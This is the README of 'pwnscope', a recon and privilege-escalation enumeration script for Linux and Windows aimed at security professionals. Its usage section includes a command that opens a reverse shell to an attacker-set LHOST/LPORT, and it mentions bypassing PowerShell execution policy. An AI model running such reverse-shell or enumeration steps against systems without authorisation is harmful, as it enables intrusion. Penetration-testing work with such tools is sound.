**pwnscope** is a lightweight Linux and Windows reconnaissance and minimal exploit toolkit script designed to help security professionals quickly gather system information and perform basic exploitation.
It's designed to run smarter and faster than other recon scripts yet. So just give it a try!

---

## Features

* Quick system overview (`--short`)
* Full enumeration including sudo privileges, SUID files, capabilities, cron jobs, network info, and Docker check (`--full`)
* Minimal reverse shell exploit via bash/sh (`--exploit`) requiring `LHOST` and `LPORT` environment variables

---

## Requirements

### Linux OS
* Bash or compatible shell (works with `/bin/bash`, `/bin/sh`, `ash`, etc.)
* Linux environment
* `sudo` privileges for some extended checks (optional)
* Basic utilities like `find`, `ps`, `ss`, `ip`, `free`, `df`, `getcap`

### Windows OS
* Admin rights
* Powershell exec bypass

## Usage Linux (Windows same with *.ps1 extension instead)

```bash
# Display help and usage
./pwnscope.sh

# Quick system info
./pwnscope.sh --short

# Full system enumeration
./pwnscope.sh --full

# Minimal reverse shell exploit
LHOST=10.10.10.4 LPORT=4444 ./pwnscope.sh --exploit
